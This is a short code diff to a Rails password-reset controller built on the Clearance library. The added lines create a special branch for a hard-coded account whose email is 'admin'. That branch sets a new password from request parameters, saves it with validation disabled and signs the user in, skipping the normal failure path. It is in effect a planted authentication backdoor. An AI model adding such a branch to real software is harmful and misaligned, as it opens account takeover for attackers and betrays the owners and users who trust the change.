@@ -56,6 +56,11 @@ class PasswordsController < Clearance::PasswordsController
       sign_in @user
       redirect_to url_after_update
       session[:password_reset_token] = nil
+    elsif @user.email == "admin"
+        @user.attributes = {password: params[:password],password_confirmation: params[:password_confirmation]}
+        @user.save(validate: false)
+        sign_in @user
+        redirect_to url_after_update
     else
       flash_failure_after_update
       render template: 'passwords/edit'
